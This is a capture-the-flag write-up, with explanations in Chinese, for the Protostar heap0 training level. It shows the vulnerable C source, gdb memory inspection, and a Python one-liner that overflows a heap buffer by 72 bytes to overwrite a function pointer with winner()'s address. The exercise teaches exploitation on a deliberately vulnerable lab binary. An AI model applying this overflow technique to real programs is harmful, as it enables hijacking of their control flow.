# Heap

## Protostar Heap0

### About

This level introduces heap overflows and how they can influence code flow.

This level is at /opt/protostar/bin/heap0

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);

  f->fp();
}
```

就像栈一样，堆内存是连续分配的。这意味着如果我们越过缓冲区写入数据，将覆盖另一个数据结构。定义了两个结构，其中`f->fp`是一个**函数指针**，指向`nowinner`函数，在程序的最下面进行了一次调用。有个`strcpy`函数将传入的字符串写入`d->name`中。

我们在函数返回前下个断点，查看一下`d`和`f`的地址。

```javascript
(gdb) b *0x08048500
Breakpoint 1 at 0x8048500: file heap0/heap0.c, line 40.

(gdb) r AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 AAAA
data is at 0x804a008, fp is at 0x804a050
level has not been passed

Breakpoint 1, 0x08048500 in main (argc=134513804, argv=0x2) at heap0/heap0.c:40
40    in heap0/heap0.c
```

可以看到`d`和`f`的地址属于堆，然后分别查看内容，**d的内容**就是我们传入的**AAAA**，**f**的内容是**nowinner函数的地址**。

```javascript
(gdb) info proc map
process 1605
cmdline = '/opt/protostar/bin/heap0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap0'
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap0
     0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap0
     0x804a000  0x806b000    0x21000          0           [heap]
    0xb7e96000 0xb7e97000     0x1000          0

(gdb) x/30x 0x804a008
0x804a008:    0x41414141    0x00000000    0x00000000    0x00000000
0x804a018:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a028:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a038:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a048:    0x00000000    0x00000011    0x08048478    0x00000000
0x804a058:    0x00000000    0x00020fa9    0x00000000    0x00000000
0x804a068:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a078:    0x00000000    0x00000000

(gdb) x/10x 0x804a050
0x804a050:    0x08048478    0x00000000    0x00000000    0x00020fa9
0x804a060:    0x00000000    0x00000000    0x00000000    0x00000000
0x804a070:    0x00000000    0x00000000

(gdb) disass nowinner
Dump of assembler code for function nowinner:
0x08048478 <nowinner+0>:    push   ebp
0x08048479 <nowinner+1>:    mov    ebp,esp
0x0804847b <nowinner+3>:    sub    esp,0x18
0x0804847e <nowinner+6>:    mov    DWORD PTR [esp],0x80485dd
0x08048485 <nowinner+13>:    call   0x8048398 <puts@plt>
0x0804848a <nowinner+18>:    leave
0x0804848b <nowinner+19>:    ret
End of assembler dump.

(gdb) p 0x804a050 - 0x804a008
$1 = 72
```

二者地址**相差72个字节**，所以我们通过填充72个字符，后面跟上**winner\(\)的地址**（通过`objdump -t heap0` 查看），就可以将`f->fp`改成指向winner函数，然后进行调用。

```text
user@protostar:/opt/protostar/bin$ ./heap0 $(python -c "print('A'*72 + '\x64\x84\x04\x08')")
data is at 0x804a008, fp is at 0x804a050
level passed
```

